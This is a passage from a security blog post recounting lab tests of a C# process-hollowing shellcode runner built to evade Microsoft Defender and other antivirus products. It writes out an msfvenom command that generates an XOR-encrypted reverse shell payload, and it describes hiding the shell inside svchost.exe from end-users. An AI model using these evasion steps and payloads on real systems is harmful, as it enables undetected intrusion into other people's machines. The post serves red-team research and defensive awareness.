<p>This allowed both virtual machines to communicate with each other and, more importantly, did not allow either to reach the internet.</p>
<p>Restricting the internet access for the Windows 11 VM was a necessary precaution, as I certainly didn't want it submitting samples if it did manage to detect the shellcode runner.</p>
<p>Additionally, I turned both "Automatic sample submission" and "Cloud-delivered protection" off in the Defender settings:</p>
<p><img alt="" decoding="async" height="262" loading="lazy" sizes="(max-width: 544px) 100vw, 544px" src="http://loganelliottinfosec.com/wp-content/uploads/2023/10/auto-sample-submit-turned-off.png" srcset="https://loganelliottinfosec.com/wp-content/uploads/2023/10/auto-sample-submit-turned-off.png 544w, https://loganelliottinfosec.com/wp-content/uploads/2023/10/auto-sample-submit-turned-off-300x144.png 300w" width="544"></img><br></br>
<img alt="" decoding="async" height="262" loading="lazy" sizes="(max-width: 544px) 100vw, 544px" src="http://loganelliottinfosec.com/wp-content/uploads/2023/10/cloud-delivered-prot-turned-off.png" srcset="https://loganelliottinfosec.com/wp-content/uploads/2023/10/cloud-delivered-prot-turned-off.png 544w, https://loganelliottinfosec.com/wp-content/uploads/2023/10/cloud-delivered-prot-turned-off-300x144.png 300w" width="544"></img></p>
<p>I also set an exclusion in Defender for the shared folder containing the PE files.</p>
<p>This was to aid in testing when transferring files to the Windows 11 VM:</p>
<p><img alt="" decoding="async" height="260" loading="lazy" sizes="(max-width: 640px) 100vw, 640px" src="http://loganelliottinfosec.com/wp-content/uploads/2023/10/shared-folder-exclusion.png" srcset="https://loganelliottinfosec.com/wp-content/uploads/2023/10/shared-folder-exclusion.png 988w, https://loganelliottinfosec.com/wp-content/uploads/2023/10/shared-folder-exclusion-300x122.png 300w, https://loganelliottinfosec.com/wp-content/uploads/2023/10/shared-folder-exclusion-768x312.png 768w" width="640"></img></p>
<p>"Real-time protection" was enabled, and all other Microsoft Defender settings were left unmodified:</p>
<p><img alt="" decoding="async" height="313" loading="lazy" sizes="(max-width: 545px) 100vw, 545px" src="http://loganelliottinfosec.com/wp-content/uploads/2023/10/rtp-enabled.png" srcset="https://loganelliottinfosec.com/wp-content/uploads/2023/10/rtp-enabled.png 545w, https://loganelliottinfosec.com/wp-content/uploads/2023/10/rtp-enabled-300x172.png 300w" width="545"></img></p>
<p>I transferred the shellcode runner from the shared folder, which was excluded from scanning, to the Desktop:</p>
<p><img alt="" decoding="async" height="326" loading="lazy" sizes="(max-width: 640px) 100vw, 640px" src="http://loganelliottinfosec.com/wp-content/uploads/2023/10/string-concat-pe-in-shared-folder-1024x522.png" srcset="https://loganelliottinfosec.com/wp-content/uploads/2023/10/string-concat-pe-in-shared-folder-1024x522.png 1024w, https://loganelliottinfosec.com/wp-content/uploads/2023/10/string-concat-pe-in-shared-folder-300x153.png 300w, https://loganelliottinfosec.com/wp-content/uploads/2023/10/string-concat-pe-in-shared-folder-768x391.png 768w, https://loganelliottinfosec.com/wp-content/uploads/2023/10/string-concat-pe-in-shared-folder.png 1109w" width="640"></img><br></br>
<img alt="" decoding="async" height="328" loading="lazy" sizes="(max-width: 640px) 100vw, 640px" src="http://loganelliottinfosec.com/wp-content/uploads/2023/10/string-concat-pe-in-desktop-1024x525.png" srcset="https://loganelliottinfosec.com/wp-content/uploads/2023/10/string-concat-pe-in-desktop-1024x525.png 1024w, https://loganelliottinfosec.com/wp-content/uploads/2023/10/string-concat-pe-in-desktop-300x154.png 300w, https://loganelliottinfosec.com/wp-content/uploads/2023/10/string-concat-pe-in-desktop-768x394.png 768w, https://loganelliottinfosec.com/wp-content/uploads/2023/10/string-concat-pe-in-desktop.png 1110w" width="640"></img></p>
<p>With the shellcode runner placed directly in the Desktop, running a "Quick Scan" with Microsoft Defender results in no detection!</p>
<p><img alt="" decoding="async" height="784" loading="lazy" sizes="(max-width: 592px) 100vw, 592px" src="http://loganelliottinfosec.com/wp-content/uploads/2023/10/no-detection-quick-scan.png" srcset="https://loganelliottinfosec.com/wp-content/uploads/2023/10/no-detection-quick-scan.png 592w, https://loganelliottinfosec.com/wp-content/uploads/2023/10/no-detection-quick-scan-227x300.png 227w" width="592"></img></p>
<p>Time to test against runtime...</p>
<p>I configured the Kali VM and Windows 11 VM with a static IPv4 address on the internal network.</p>
<p>Kali VM: <strong>192.168.1.2</strong></p>
<p>Windows 11 VM: <strong>192.168.1.3</strong></p>
<p><img alt="" decoding="async" height="1305" loading="lazy" src="http://loganelliottinfosec.com/wp-content/uploads/2023/10/met-rev-https-def-tsk-mgr.gif" width="1213"></img></p>
<p>Success!</p>
<p>The reverse shell pops without being detected by Defender!</p>
<p>Additionally, I confirm that the process hollowing injection for svchost.exe worked.</p>
<p>Retrieving the PID (1428) from Meterpreter using the <strong>getpid</strong> command and searching for the corresponding PID in Task Manager shows that I have successfully hidden within the svchost.exe process.</p>
<p>However, there is one more problem to solve...</p>
<p>While the shellcode runner executes and I receive a reverse shell without triggering Defender, if a scan is run <em>while</em> the Meterpreter session is active, Defender will detect the behavior of the Meterpreter code running within the hollowed-out svchost.exe process:</p>
<p><img alt="" decoding="async" height="351" loading="lazy" src="http://loganelliottinfosec.com/wp-content/uploads/2023/10/met-svchost-detected.gif" width="640"></img><br></br>
<img alt="" decoding="async" height="376" loading="lazy" sizes="(max-width: 640px) 100vw, 640px" src="http://loganelliottinfosec.com/wp-content/uploads/2023/10/details-met-svchost-detection.png" srcset="https://loganelliottinfosec.com/wp-content/uploads/2023/10/details-met-svchost-detection.png 688w, https://loganelliottinfosec.com/wp-content/uploads/2023/10/details-met-svchost-detection-300x176.png 300w" width="640"></img></p>
<p>However, there is a simple solution to this problem...</p>
<p>Get rid of Meterpreter.</p>
<h4>Fully Undetectable Process Hollowing on Windows 🥷</h4>
<p>By simply swapping out the Meterpreter payload in the shellcode runner with a non-meterpreter payload, I could successfully fly under the radar, even while on-demand scanning is performed.</p>
<p>The payload I chose was:</p>
<p><strong>windows/x64/shell/reverse_tcp</strong></p>
<code class="language-solid">msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.1.2 LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key z -i 20 | tr -d 'nr' </code>
<p>After swapping out the payload, I transferred the new version of the shellcode runner named "HollowGhostTcp" to the Windows 11 VM and tested it:</p>
<p><img alt="" decoding="async" height="719" loading="lazy" src="http://loganelliottinfosec.com/wp-content/uploads/2023/10/scan-time-undetected-both-runners.gif" width="867"></img></p>
<p>Once again, both versions of the shellcode runner remained undetected during scan-time.</p>
<h5>Testing at Runtime:</h5>
<p><img alt="" decoding="async" height="719" loading="lazy" src="http://loganelliottinfosec.com/wp-content/uploads/2023/10/clearer-tcp-undetected-runtime-tskmgr.gif" width="867"></img></p>
<p>The reverse shell is returned!</p>
<p>Viewing the PID (2596) of the newly created svchost.exe process with Process Hacker shows the child processes <em>cmd.exe</em> and <em>conhost.exe</em>.</p>
<p>But, searching for the PID of the svchost.exe process in Task Manager shows only the svchost.exe process.</p>
<p>Thus allowing me to remain undetected by end-users.</p>
<p><img alt="" decoding="async" height="615" loading="lazy" sizes="(max-width: 692px) 100vw, 692px" src="http://loganelliottinfosec.com/wp-content/uploads/2023/10/centered-terminate-svchost-warning.png" srcset="https://loganelliottinfosec.com/wp-content/uploads/2023/10/centered-terminate-svchost-warning.png 692w, https://loganelliottinfosec.com/wp-content/uploads/2023/10/centered-terminate-svchost-warning-300x267.png 300w" width="692"></img></p>
<p>Additionally, the lovely little warning that Windows gives when you attempt to terminate a svchost.exe process may also help dissuade end-users. ;P</p>
<h5>FUD During On-Demand Scanning With Shell:</h5>
<p><img alt="" decoding="async" height="719" loading="lazy" src="http://loganelliottinfosec.com/wp-content/uploads/2023/10/whoami-tcp-active-scan-undetected.gif" width="867"></img></p>
<p>Victory! 🏆</p>
<p>After much experimentation, I was finally left with a process hollowing shellcode runner that is FUD against Microsoft Defender without using a third-party obfuscator.</p>
<p>The shellcode runner, which employs AES encryption to obfuscate the file path string, also remains FUD during on-demand scanning when using the payload:</p>
<p><strong>windows/x64/shell/reverse_tcp</strong></p>
<p><img alt="" decoding="async" height="719" loading="lazy" src="http://loganelliottinfosec.com/wp-content/uploads/2023/10/enc-path-runner-fud-on-demand-scan.gif" width="867"></img></p>
<h2>Conclusion</h2>
<p>Creativity is the most essential weapon in any hacker's arsenal in the ever-evolving arms race between attackers and defenders.</p>
<p>Tenacity is a close second.</p>
<p>Given the vast amount of signatures for Metasploit payloads, simple encryption won't be enough to shake off most antivirus.</p>
<p>In the modern age of antivirus, advancements in emulation have led to the circumvention of many popular bypass techniques.</p>
<p>However, some antivirus vendors still need to improve in this regard.</p>
<p>In my testing, I found that Avast, Avira, AVG, Norman, and VirusFighter still seemed susceptible to the sandbox and emulator bypasses I used.</p>
<p>Third-party obfuscators can markedly improve detection ratings.</p>
<p>However, not using them as a crutch is a good idea.</p>
<h4>Main Takeaway</h4>
<p>Utilizing custom delegate functions in C# is an excellent way to abstract and obfuscate the usage of Win32 API functions.</p>
<p>This remains an effective way of obfuscating Win32 API functions, even without using D/Invoke to abstract the P/Invoke imports.</p>
<p>This technique worked surprisingly well against Microsoft Defender, ESET NOD32, Acrabit, Alyac, Emsisoft, and G-Data.</p>
```
